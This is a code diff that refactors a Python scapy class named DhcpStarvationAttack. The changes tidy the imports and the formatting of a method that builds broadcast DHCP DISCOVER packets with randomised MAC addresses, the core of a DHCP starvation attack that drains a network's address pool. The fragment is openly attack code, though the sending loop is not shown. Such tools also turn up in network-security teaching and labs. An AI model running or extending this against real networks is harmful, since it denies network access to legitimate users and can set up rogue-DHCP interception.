@@ -1,8 +1,13 @@
-from scapy.all import *
+from scapy.config import conf
+from scapy.layers.dhcp import BOOTP, DHCP
+from scapy.layers.inet import IP, UDP
+from scapy.layers.l2 import Ether
+from scapy.sendrecv import sendp
+from scapy.volatile import RandMAC
 
 
 class DhcpStarvationAttack:
-    def __init__(self, network_interface = str):
+    def __init__(self, network_interface: str):
         self.network_interface = network_interface
         self.count_send_packets = 1
 
@@ -19,8 +24,8 @@ class DhcpStarvationAttack:
         # Building the DISCOVER packet
         # Making an Ethernet packet
         dhcp_discover = Ether(dst='ff:ff:ff:ff:ff:ff', src=RandMAC(), type=0x0800) \
-                    / IP(src='0.0.0.0', dst='255.255.255.255') \
-                    / UDP(dport=67,sport=68) \
-                    / BOOTP(op=1, chaddr=RandMAC()) \
-                    / DHCP(options=[('message-type','discover'), ('end')])
+                        / IP(src='0.0.0.0', dst='255.255.255.255') \
+                        / UDP(dport=67, sport=68) \
+                        / BOOTP(op=1, chaddr=RandMAC()) \
+                        / DHCP(options=[('message-type', 'discover'), ('end')])
         return dhcp_discover
